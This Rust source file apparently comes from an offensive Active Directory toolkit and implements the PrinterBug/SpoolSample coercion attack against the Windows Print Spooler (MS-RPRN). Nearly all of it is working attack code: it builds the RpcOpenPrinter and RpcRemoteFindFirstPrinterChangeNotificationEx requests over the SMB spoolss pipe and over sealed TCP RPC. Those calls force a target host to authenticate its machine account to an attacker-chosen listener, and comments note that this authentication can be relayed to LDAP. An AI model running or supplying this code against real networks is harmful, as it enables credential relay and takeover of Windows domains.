//! MS-RPRN coercion (PrinterBug / SpoolSample) — `RpcOpenPrinter` +
//! `RpcRemoteFindFirstPrinterChangeNotificationEx` force the target's Print Spooler to
//! connect back to an attacker UNC path, triggering outbound machine-account auth
//! (relayable, e.g. to LDAP for RBCD/shadow-cred). Rides the SMB `\spoolss` named pipe.

use crate::ndr::NdrEncoder;
use crate::transport::{RpcTcp, SmbPipe};
use crate::{epm, Result, RpcError, Syntax};
use adhammer_smb::SmbClient;

/// MS-RPRN interface (Print System Remote Protocol), v1.0.
pub fn rprn_syntax() -> Syntax {
    Syntax::new("12345678-1234-abcd-ef00-0123456789ab", 1, 0)
}

pub const OPNUM_OPEN_PRINTER: u16 = 1;
pub const OPNUM_RFFPCNEX: u16 = 65; // RpcRemoteFindFirstPrinterChangeNotificationEx

/// RpcOpenPrinter(pPrinterName [in,string,unique], pHandle [out], pDatatype [in,string,unique]
/// = NULL, pDevModeContainer [in], AccessRequired [in]).
fn encode_open_printer(printer_name: &str) -> Vec<u8> {
    let mut e = NdrEncoder::new();
    e.referent(); // pPrinterName pointer
    e.conformant_varying_wstr(printer_name); // "\\TARGET"
    e.null_ptr(); // pDatatype = NULL
    e.u32(0); // DEVMODE_CONTAINER.cbBuf = 0
    e.null_ptr(); // DEVMODE_CONTAINER.pDevMode = NULL
    e.u32(0); // AccessRequired
    e.into_bytes()
}

/// RpcRemoteFindFirstPrinterChangeNotificationEx(hPrinter [in], fdwFlags, fdwOptions,
/// pszLocalMachine [in,string,unique] = "\\ATTACKER", dwPrinterLocal, pOptions = NULL).
fn encode_rffpcnex(handle: &[u8; 20], local_machine: &str) -> Vec<u8> {
    let mut e = NdrEncoder::new();
    e.bytes(handle); // PRINTER_HANDLE (context handle, 20 bytes)
    e.u32(0x0000_0100); // fdwFlags = PRINTER_CHANGE_ADD_JOB
    e.u32(0); // fdwOptions
    e.referent(); // pszLocalMachine pointer
    e.conformant_varying_wstr(local_machine); // the callback target → coercion
    e.u32(0); // dwPrinterLocal
    e.null_ptr(); // pOptions = NULL
    e.into_bytes()
}

pub struct PrinterBug<'a> {
    pipe: SmbPipe<'a>,
}

impl<'a> PrinterBug<'a> {
    pub async fn bind(client: &'a mut SmbClient, file_id: [u8; 16]) -> Result<Self> {
        let mut pipe = SmbPipe::new(client, file_id);
        pipe.bind(rprn_syntax()).await?;
        Ok(PrinterBug { pipe })
    }

    /// Open a printer handle to `\\target`, then fire RFFPCNEx pointing at `\\listener` so the
    /// target spooler authenticates back to the attacker. Returns the RFFPCNEx status word.
    pub async fn coerce(&mut self, target: &str, listener: &str) -> Result<u32> {
        let resp = self
            .pipe
            .call(OPNUM_OPEN_PRINTER, &encode_open_printer(&format!("\\\\{target}")))
            .await?;
        if resp.len() < 24 {
            return Err(RpcError::Protocol("RpcOpenPrinter reply too short".into()));
        }
        let handle: [u8; 20] = resp[0..20].try_into().unwrap();
        let open_status = u32::from_le_bytes(resp[resp.len() - 4..].try_into().unwrap());
        if open_status != 0 || handle == [0u8; 20] {
            return Err(RpcError::Protocol(format!("RpcOpenPrinter failed: 0x{open_status:08x}")));
        }
        let resp = self
            .pipe
            .call(OPNUM_RFFPCNEX, &encode_rffpcnex(&handle, &format!("\\\\{listener}")))
            .await?;
        Ok(u32::from_le_bytes(resp[resp.len() - 4..].try_into().unwrap()))
    }
}

/// Extract the printer handle + return status from an RpcOpenPrinter reply stub.
fn open_printer_result(resp: &[u8]) -> Result<[u8; 20]> {
    if resp.len() < 24 {
        return Err(RpcError::Protocol("RpcOpenPrinter reply too short".into()));
    }
    let handle: [u8; 20] = resp[0..20].try_into().unwrap();
    let status = u32::from_le_bytes(resp[resp.len() - 4..].try_into().unwrap());
    if status != 0 || handle == [0u8; 20] {
        return Err(RpcError::Protocol(format!("RpcOpenPrinter failed: 0x{status:08x}")));
    }
    Ok(handle)
}

/// PrinterBug over ncacn_ip_tcp (EPM-resolved, NTLM sign+sealed) — the path modern spoolers
/// expose when the `\spoolss` SMB pipe is unavailable. Coerces `\\target` to auth to `\\listener`.
pub async fn printerbug_tcp(
    host: &str,
    domain: &str,
    user: &str,
    password: &str,
    target: &str,
    listener: &str,
) -> Result<u32> {
    let port = epm::resolve_port(host, rprn_syntax()).await?;
    let mut rpc = RpcTcp::connect(&format!("{host}:{port}")).await?;
    rpc.bind_sealed(rprn_syntax(), domain, user, password, "ADHAMMER").await?;
    let resp = rpc.call_sealed(OPNUM_OPEN_PRINTER, &encode_open_printer(&format!("\\\\{target}"))).await?;
    let handle = open_printer_result(&resp)?;
    let resp = rpc.call_sealed(OPNUM_RFFPCNEX, &encode_rffpcnex(&handle, &format!("\\\\{listener}"))).await?;
    Ok(u32::from_le_bytes(resp[resp.len() - 4..].try_into().unwrap()))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn open_printer_marshals_name() {
        let stub = encode_open_printer("\\\\dc01");
        assert_ne!(u32::from_le_bytes(stub[0..4].try_into().unwrap()), 0); // referent
        assert_eq!(&stub[stub.len() - 4..], &[0, 0, 0, 0]); // AccessRequired
    }

    #[test]
    fn rffpcnex_carries_handle_and_listener() {
        let stub = encode_rffpcnex(&[0x41; 20], "\\\\10.0.0.5");
        assert_eq!(&stub[0..20], &[0x41; 20]); // PRINTER_HANDLE
        assert_eq!(&stub[stub.len() - 4..], &[0, 0, 0, 0]); // pOptions NULL
    }
}
